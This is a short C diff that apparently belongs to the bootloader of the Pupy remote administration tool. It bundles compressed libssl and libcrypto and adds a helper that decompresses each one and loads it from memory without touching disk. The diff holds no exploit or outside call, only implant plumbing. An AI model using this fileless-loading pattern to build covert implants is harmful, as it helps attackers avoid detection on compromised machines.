@@ -15,10 +15,13 @@
 #include "Python-dynload.h"
 
 #include "_memimporter.h"
+#include "tmplibrary.h"
 #include "debug.h"
 
 #include "resources_bootloader_pyc.c"
 #include "resources_python27_so.c"
+#include "resources_libssl_so.c"
+#include "resources_libcrypto_so.c"
 
 extern DL_EXPORT(void) init_memimporter(void);
 extern DL_EXPORT(void) initpupy(void);
@@ -31,6 +34,27 @@ extern DL_EXPORT(void) initpupy(void);
 #endif
 
 #include "lzmaunpack.c"
+
+static inline void xz_dynload(const char *soname, const char *xzbuf, size_t xzsize) {
+	void *uncompressed = NULL;
+	size_t uncompressed_size = 0;
+
+	uncompressed = lzmaunpack(xzbuf, xzsize, &uncompressed_size);
+
+	if (!uncompressed) {
+		dprint("%s decompression failed\n", soname);
+		abort();
+	}
+
+	void *res = memdlopen(soname, (char *) uncompressed, uncompressed_size);
+
+	free(uncompressed);
+
+	if (!res) {
+		dprint("loading %s from memory failed\n", soname);
+		abort();
+	}
+}
 
 uint32_t mainThread(int argc, char *argv[], bool so) {
 
@@ -70,6 +94,9 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
 			return -1;
 		}
 	}
+
+	xz_dynload("libcrypto.so.1.0.0", resources_libcrypto_so_start, resources_libcrypto_so_size);
+	xz_dynload("libssl.so.1.0.0", resources_libssl_so_start, resources_libssl_so_size);
 
 	dprint("calling PyEval_InitThreads() ...\n");
 	PyEval_InitThreads();
